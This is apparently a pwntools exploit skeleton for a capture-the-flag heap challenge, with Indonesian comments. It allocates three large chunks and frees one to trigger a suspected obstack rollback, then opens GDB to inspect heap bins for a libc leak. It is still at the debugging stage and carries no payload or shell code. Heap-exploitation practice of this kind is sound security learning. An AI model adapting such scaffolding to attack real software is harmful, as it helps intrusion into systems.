#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal = ["wt.exe", "wsl.exe"] 

# GDB Script yang agresif untuk inspeksi visual
# Kita break tepat setelah free(0) untuk melihat nasib Chunk B dan C
gdbscript = '''
# Breakpoint setelah menu free kembali
b *main+586
continue

# Saat berhenti (breakpoint hit):
echo \n[+] STATE ANALYZER [+]\n
echo --- CHUNKS ARRAY ---\n
x/4gx &chunks

echo \n--- CHUNK 1 (Target Leak) ---\n
# Kita inspect pointer yang ada di chunks[1]
# Perhatikan apakah memorinya masih valid atau sudah merged ke Top
p/x chunks[1]
x/8gx chunks[1]-0x20

echo \n--- CURRENT HEAP BINS ---\n
# Tampilkan status bin (membutuhkan GEF/Pwndbg)
heap bins
vis
'''

def conn():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        return process([exe.path])

p = conn()

def alloc(idx, size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)

def free(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def view(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx: ", str(idx).encode())

# --- TRIGGER LOGIC ---
log.info("Allocating chunks...")
alloc(0, 0x420, b"A"*8) # Chunk A (Old)
alloc(1, 0x420, b"B"*8) # Chunk B (Target Leak)
alloc(2, 0x420, b"C"*8) # Chunk C (Top Border)

log.info("Freeing Chunk 0 (A) -> Triggers Obstack Rollback...")
# Ini akan membebaskan C, lalu B.
# Chunk A akan tetap aktif.
free(0)

# Script akan berhenti di sini dan membuka GDB.
# Kita tidak melakukan view() dulu agar bisa debug manual.
p.interactive()